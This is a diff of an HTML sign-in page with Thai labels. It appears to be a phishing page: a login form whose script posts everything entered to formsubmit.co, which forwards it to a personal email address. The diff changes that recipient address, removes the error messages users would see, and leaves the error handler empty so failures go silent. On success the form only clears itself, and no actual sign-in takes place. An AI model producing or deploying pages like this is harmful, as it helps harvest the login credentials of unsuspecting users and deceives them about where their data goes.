@@ -171,32 +171,28 @@
   <button type="submit" class="login-button">ลงชื่อเข้าใช้</button>
 </form>
 
-<p id="message" style="color: lightgreen;"></p>
-
 <script>
   document.getElementById("myForm").addEventListener("submit", function(e) {
-    e.preventDefault(); // ยกเลิกพฤติกรรม redirect เดิม
+    e.preventDefault(); // ป้องกันการ reload หน้า
 
     const form = e.target;
     const data = new FormData(form);
 
-    fetch("https://formsubmit.co/ajax/good.abcdfg@gmail.com", {
+    fetch("https://formsubmit.co/ajax/vy140281@email.com", {
       method: "POST",
       body: data,
       headers: {
-        'Accept': 'application/json' // <<< ใช้ endpoint แบบ AJAX
+        'Accept': 'application/json'
       }
     })
     .then(response => response.json())
     .then(result => {
-      if (result.success) 
-        form.reset();
-      } else {
-        document.getElementById("message").innerText = "เข้าไม่สำเร็จ กรุณาลองใหม่";
+      if (result.success) {
+        form.reset(); // ส่งเสร็จแล้วล้างข้อมูล
       }
     })
     .catch(error => {
-      document.getElementById("message").innerText = "เกิดข้อผิดพลาด: " + error;
+      // ถ้าอยากให้เงียบแม้จะ error ก็ปล่อยว่างไว้แบบนี้
     });
   });
 </script>
